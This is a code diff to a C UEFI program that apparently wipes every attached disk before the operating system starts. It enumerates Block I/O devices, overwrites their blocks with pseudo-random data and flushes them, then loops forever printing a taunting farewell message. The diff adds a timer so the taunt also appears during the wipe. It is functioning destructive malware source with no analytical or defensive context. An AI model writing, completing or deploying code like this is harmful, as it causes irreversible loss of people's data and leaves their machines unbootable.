@@ -10,6 +10,9 @@
 #define MAX_BLOCK_SIZE 4096
 #define MAX_BUFFER_SIZE (SAFE_BATCH_BLOCKS * MAX_BLOCK_SIZE)
 
+static BOOLEAN gWipeComplete = FALSE;
+static BOOLEAN gShouldPrintMessage = FALSE;
+
 static SIMPLE_TEXT_OUTPUT_INTERFACE *ConOut = NULL;
 
 UINT64 lcg_seed = 1;
@@ -17,6 +20,16 @@ UINT64 lcg_seed = 1;
 UINT64 lcg_rand() {
     lcg_seed = (lcg_seed * LCG_A + LCG_C) % LCG_M;
     return lcg_seed;
+}
+
+VOID EFIAPI MessageTimerCallback(
+    IN EFI_EVENT Event,
+    IN VOID *Context
+) {
+    if (!gWipeComplete) {
+
+        gShouldPrintMessage = TRUE;
+    }
 }
 
 EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
@@ -29,9 +42,31 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
     EFI_HANDLE *HandleBuffer = NULL;
     UINTN HandleCount = 0;
     UINT8 *Buffer = NULL;
+    EFI_EVENT MessageTimer;
+
+    Status = BS->CreateEvent(
+        EVT_TIMER | EVT_NOTIFY_SIGNAL,
+        TPL_CALLBACK,
+        MessageTimerCallback,
+        NULL,
+        &MessageTimer
+    );
+    if (EFI_ERROR(Status)) {
+        return Status;
+    }
+
+    Status = BS->SetTimer(MessageTimer, TimerPeriodic, 500000000ULL);
+    if (EFI_ERROR(Status)) {
+        BS->CloseEvent(MessageTimer);
+        return Status;
+    }
+
+    ConOut->ClearScreen(ConOut);
+    ConOut->SetAttribute(ConOut, EFI_LIGHTGRAY | EFI_BACKGROUND_BLACK);
 
     Status = BS->AllocatePool(EfiBootServicesData, MAX_BUFFER_SIZE, (void **)&Buffer);
     if (EFI_ERROR(Status)) {
+        BS->CloseEvent(MessageTimer);
         return Status;
     }
 
@@ -44,6 +79,7 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
     );
     if (EFI_ERROR(Status)) {
         BS->FreePool(Buffer);
+        BS->CloseEvent(MessageTimer);
         return Status;
     }
 
@@ -99,13 +135,18 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
             } else {
                 Status = BlockIo->FlushBlocks(BlockIo);
                 if (EFI_ERROR(Status)) {
-
+                    // Intentionally do nothing on flush error
                 }
+            }
+
+            if (gShouldPrintMessage) {
+                Print(L"This is my world without you, bro. Empty. T-T\n");
+                Print(L"Stay with me or you will not see me again forever.\n");
+                gShouldPrintMessage = FALSE; // Reset the flag
             }
         }
         BS->CloseProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, ImageHandle, NULL);
     }
-
 
     if (HandleBuffer) {
         BS->FreePool(HandleBuffer);
@@ -113,19 +154,15 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
     if (Buffer) {
         BS->FreePool(Buffer);
     }
-
-
-    ConOut->ClearScreen(ConOut);
-    ConOut->SetAttribute(ConOut, EFI_LIGHTGRAY | EFI_BACKGROUND_BLACK);
-
+    
+    gWipeComplete = TRUE;
 
     for (;;) {
         Print(L"This is my world without you, bro. Empty. T-T\n");
         Print(L"Stay with me or you will not see me again forever.\n");
-
         BS->Stall(500000);
     }
 
-
+    BS->CloseEvent(MessageTimer);
     return EFI_SUCCESS;
 }
